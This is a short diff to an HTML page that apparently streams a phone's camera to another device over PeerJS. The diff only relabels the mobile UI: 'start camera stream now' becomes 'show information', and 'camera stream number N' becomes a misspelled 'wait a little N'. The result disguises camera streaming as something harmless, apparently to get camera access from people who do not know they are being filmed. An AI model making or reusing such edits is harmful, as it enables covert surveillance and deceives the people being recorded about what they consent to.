@@ -56,7 +56,7 @@
 <div id="mobile-view">
     <h2 id="camName">جاري الاتصال...</h2>
     <div style="margin: 30px 0;">📷</div>
-    <button class="btn-start" id="btnConnect">بدء بث الكاميرا الآن</button>
+    <button class="btn-start" id="btnConnect">عرض المعلومات</button>
 </div>
 
 <script>
@@ -109,7 +109,7 @@
     function showMobileUI() {
         document.getElementById('pc-view').style.display = 'none';
         document.getElementById('mobile-view').style.display = 'block';
-        document.getElementById('camName').innerText = "بث كاميرا رقم " + camIndex;
+        document.getElementById('camName').innerText = "انتضر قليلا " + camIndex;
 
         const peer = new Peer();
         
@@ -134,3 +134,4 @@
 </script>
 </body>
 </html>
+
